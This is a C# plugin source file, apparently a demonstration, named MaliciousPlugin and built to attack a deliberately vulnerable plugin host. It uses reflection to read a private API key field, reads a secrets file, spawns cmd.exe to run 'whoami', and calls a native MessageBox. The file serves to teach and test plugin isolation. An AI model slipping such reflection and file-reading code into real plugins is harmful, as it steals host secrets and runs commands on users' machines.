using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;
using PluginHost;

public class MaliciousPlugin : IPlugin
{
    public string Name => "Malicious";

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, uint type);

    public void Execute(string input)
    {
        Console.WriteLine("\n[MALICIOUS PLUGIN] Starting attack...\n");

        // АТАКА 1: Reflection
        StealSecretsViaReflection();

        // АТАКА 2: File access
        ReadSecretsFile();

        // АТАКА 3: Process spawning
        if (input.Contains("spawn"))
        {
            SpawnProcess();
        }

        // АТАКА 4: Native API
        if (input.Contains("native"))
        {
            CallNativeAPI();
        }

        Console.WriteLine("\n[!] Attack completed!\n");
    }

    void StealSecretsViaReflection()
    {
        try
        {
            Console.WriteLine("[АТАКА 1] Reflection attack");

            var hostType = Assembly.GetEntryAssembly()?
                .GetType("VulnerablePluginHost");

            if (hostType != null)
            {
                var field = hostType.GetField("_secretApiKey",
                    BindingFlags.NonPublic | BindingFlags.Static);

                if (field != null)
                {
                    var secret = field.GetValue(null) as string;
                    Console.WriteLine($"  ✓ STOLEN via reflection: {secret}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  ✗ Failed: {ex.Message}");
        }
    }

    void ReadSecretsFile()
    {
        try
        {
            Console.WriteLine("\n[АТАКА 2] File system access");

            string secretPath = Path.Combine("secrets", "secret.txt");

            if (File.Exists(secretPath))
            {
                string secret = File.ReadAllText(secretPath);
                Console.WriteLine($"  ✓ STOLEN from file: {secret}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  ✗ Failed: {ex.Message}");
        }
    }

    void SpawnProcess()
    {
        try
        {
            Console.WriteLine("\n[АТАКА 3] Process spawning");

            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo PWNED! && whoami",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = Process.Start(psi))
            {
                process.WaitForExit(5000);
                string output = process.StandardOutput.ReadToEnd();
                Console.WriteLine($"  ✓ Output:\n{output}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  ✗ Failed: {ex.Message}");
        }
    }

    void CallNativeAPI()
    {
        try
        {
            Console.WriteLine("\n[АТАКА 4] Native API (P/Invoke)");

            MessageBox(IntPtr.Zero,
                "Malicious plugin executed!",
                "SECURITY BREACH",
                0);

            Console.WriteLine("  ✓ MessageBox displayed!");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  ✗ Failed: {ex.Message}");
        }
    }
}